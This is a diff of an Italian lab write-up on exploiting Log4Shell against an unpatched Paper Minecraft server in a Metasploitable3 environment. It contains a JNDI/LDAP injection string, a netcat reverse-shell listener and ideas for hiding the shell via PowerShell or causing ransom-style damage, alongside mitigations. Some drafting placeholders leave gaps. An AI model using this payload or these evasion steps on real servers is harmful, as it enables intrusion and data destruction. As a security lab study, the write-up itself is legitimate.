@@ -9,14 +9,15 @@ Nella versione 1.8.0/1.8.8 del gioco è stata trovata la vulnerabilità zero-day
 Microsoft ha successivamente rilasciato una patch per prevenirne gli abusi direttamente sostituendo la versione nella repository ufficiale. Questi server sono chiamati "Vanilla", ossia senza modifiche del server stesso, tuttavia non sono in grado di prevenire l'abuso di cheat all'interno del gioco non offrendo funzionalità aggiuntive e per questo motivo sono stati creati dalla community, versioni di terze parti (es: Bukkit, Spigot, Paper) che consentono maggior sicurezza e l'installazione di plugins scritti in Java.
 Visto che il server Vanilla vulnerabile è di difficile reperibilità, si è proceduto tramite risorse esterne a scaricare un server di terze parti molto popolare "Paper" che ha successivamente patchato il server ma la sua versione unpatched è più facile da reperire.
 
-**Log4j**: La vulnerabilità si basa sul framework Log4j che consente di gestire il logging dell'applicazione o dei servizi online ed ha anche la possibilità di comunicare con altri servizi sul sistema. Minecraft implementa questo framework che sarà la causa della vulnerabilità.
+**Log4j**: La vulnerabilità si basa sul framework Log4j che consente di gestire il logging dell'applicazione o dei servizi online ed ha anche la possibilità di comunicare con altri servizi sul sistema. Il problema nasce da una funzionalità di lookup delle JNDI (Java Name and Directory Interface), funzione abilitata di default nelle versioni critche di Log4j, che consente tramite il log, di ottenere delle variabili. In questo caso si forza l'ottenimento di un oggetto Java tramite un server LDAP che può essere potenzialmente ovunque su internet. 
+Minecraft implementa questo framework che sarà la causa della vulnerabilità.
 
 ## L'attacco
 L'attacco parte sulla creazione di un server LDAP che sarà il punto di ingresso del traffico verso la vittima.
-Viene in oltre messo su un server http (in questo caso viene usato un server python) che sarà l'esecutore dell'inziezione del codice malevolo.
+Viene in oltre messo su un server http (in questo caso viene usato un server python) che sarà l'esecutore dell'iniezione del codice malevolo.
 Già questo basterebbe per la compromissione del sistema attaccato, tuttavia si è voluto anche creare una classe Java che consenta anche la Remote Code Execution tramite reverse shell. Perciò risulta necessaria la creazione di un ulteriore server TCP, nel nostro caso useremo Netcat.
 
-** **: Nella fase di , una volta scelto il targert, si deve pensare ad una strategia di anominizzazione, s
+** **: Nella fase di , una volta scelto il target, si deve pensare ad una strategia di anominizzazione, s
 
 **Injection**: La fase di iniezione consiste di inviare via chat di gioco, un ????????? così composto: `${jndi:ldap://ip_serverLDAP_attaccante:porta_ldap/NomeClasseJavaMalevola}`, ciò farà si che il framework inzi una connessione LDAP al server dell'attaccante.
 Non ci sono particolari complicanze in questa fase e questo messaggio può essere potenzialmente inviato da qualsiasi giocatore e da qualsiasi IP.
@@ -76,18 +77,21 @@ netcat -lnvp <porta>
     ${{\color{yellowgreen}{{\textbf{\textsf{Soluzione:}}}}}}$ Tramite i file di log presenti nella cartella del server si è analizzato l'errore: "Server exete maxium -----", questo è dovuto al fatto che di default il server è configurato per avere un tempo (in tick di gioco) massimo di risposta di XXXXXXX tick. Essendo questo valore predefinito troppo basso, non dava il tempo di eseguire e mantenere la connessione al Netcat dell'attaccante. Si è proceduto così ad aumentare questo tempo e per fini pratici lo si è impostato a "-1" in modo da disattivarlo.[<sup>2</sup>](#2-questa-modificva-è-stata-effettuata-sul-file-serverproprities-contenente-la-configurazione-di-base-del-server-alla-riga-max-tick-si-è-sostiuito-il-valore-in--1)
 
 ---
-3. ${{\color{orangered}{{\textbf{\textsf{Criticità:}}}}}}$ A seguito della buona riuscita della connessione con questa tecnica di reverse-shell si è notato che il server rimane funzionale ma viene generato per i giocatori un lag/interruzione per entrare nel server.<br>
+3. ${{\color{Goldenrod}{{\textbf{\textsf{Problematica:}}}}}}$ <br>
+    ${{\color{yellowgreen}{{\textbf{\textsf{Soluzione:}}}}}}$
+---
+4. ${{\color{orangered}{{\textbf{\textsf{Criticità:}}}}}}$ A seguito della buona riuscita della connessione con questa tecnica di reverse-shell si è notato che il server rimane funzionale ma viene generato per i giocatori un lag/interruzione per entrare nel server.<br>
 ${{\color{yellowgreen}{{\textbf{\textsf{Possibile raggiro:}}}}}}$ Chiaramente questo non ha a che fare con la buona riuscita dell'attacco ma solo ha solo scopo di ridurre la tracciabilità dello stesso. Si può quindi, riscrivendo la classe Java, invece di eseguire direttamente una reverse shell sul server attaccato, la si può far scaricare tramite anche uno script powershell ed eseguirla in modalità nascosta senza impattattare il server di gioco.
 ---
 ##### [1](#poc-e-problematiche-rilevate): Quasi tutti i server di gioco sono impostati con la porta *well-known* '25565', se non diversamente configurati, anche nel nostro caso si è proceduto a lasciare la porta predefinita.
-##### [2](#problematiche-e-criticità-riscontrate): Questa modificva è stata effettuata sul file `server.proprities` contenente la configurazione di base del server, alla riga `max-tick` si è sostiuito il valore in '-1'.
+##### [2](#problematiche-e-criticità-riscontrate): Questa modifica è stata effettuata sul file `server.proprities` contenente la configurazione di base del server, alla riga `max-tick` si è sostiuito il valore in '-1'.
 ---
-# Conclusioni e mitigazioni
+# Treath model, mitigazioni e conclusioni
 L'esecuzione di questo attacco non risulta eccessivamente ostica ma si necessita di server che in un contesto reale ad oggi difficilmente troverebbe applicazione date le patch rilasciate da Microsoft e la difficoltà di trovare, anche intenzionalmente, server vulnerabili.
 C'è in oltre da considerare che l'ambiente utilizzato (Metasploitable3) è preconfigurato in modo tale da avere pochissime restrizioni in merito alla sicurezza, per cui su ambienti più sicuri questo attacco comporterebbe poca se non nulla .....
 Già utilizzando una buona configurazione di un firewall si riuscirebbe a mitigare l'attacco, l'utilizzo di un ????? antivirus potrebbe rilevare la backdoor se non opportunamente mascherata. 
-Anche Windows, in particolare con le sue versioni più aggiornate. è in grado di rilevare l'esecuzione di script malevoli.
-Tuttavia sotto un punto di vista dell'***impatto***, se non si è interessati a prendere il controllo completo del pc o ad un esflitrazioni dati, modificando opportunamente la classe Java si potrebbe arrecare comunque danni tramite la cancellazione di file sensibili ecc..
+Anche Windows, in particolare con le sue versioni più aggiornate, è in grado di rilevare l'esecuzione di script malevoli.
+Tuttavia sotto un punto di vista dell'***impatto***, se non si è interessati a prendere il controllo completo del pc o ad un esflitrazioni di dati, modificando opportunamente la classe Java si potrebbe arrecare comunque danni tramite la cancellazione di file sensibili o alla crittazione del disco con riscatto ecc..
 
 ---
 
@@ -96,10 +100,11 @@ Tuttavia sotto un punto di vista dell'***impatto***, se non si è interessati a 
 
 > * [Paper is a Minecraft game server based on Spigot, designed to greatly improve performance and offer more advanced features and API.](https://papermc.io/)   
 
+> * [NIST - NATIONAL VULNERABILITY DATABASE: CVE-2021-44228 (Log4Shell)](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)
 
 ---
 
-<br></br>
+<br>
 <div dir='rtl'
 
 < *A cura di **TRIPALDI Gabriele*** ></div>
